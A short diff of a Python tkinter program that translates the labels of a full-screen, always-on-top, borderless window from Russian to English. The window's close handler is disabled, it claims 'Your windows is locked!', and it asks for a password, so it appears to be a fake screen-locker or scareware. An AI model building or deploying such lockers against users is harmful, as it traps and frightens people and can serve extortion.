@@ -33,8 +33,8 @@ root.protocol("WM_DELETE_WINDOW", lambda arg: ...)  # Same as Quit only simplifi
 root.attributes("-topmost", 1)
 root.geometry(f"{X}x{Y}")
 root.overrideredirect(1)
-Label(text="Ваш Windows заблокирован!", fg="red", bg=bg, font=font).pack()
-Label(text="\n\n\n\nВведите пароль", fg="white", bg=bg, font=font).pack()
+Label(text="Your windows is locked!", fg="red", bg=bg, font=font).pack()
+Label(text="\n\n\n\ntype the pussword", fg="white", bg=bg, font=font).pack()
 
 password = Entry(font=font)
 password.pack()
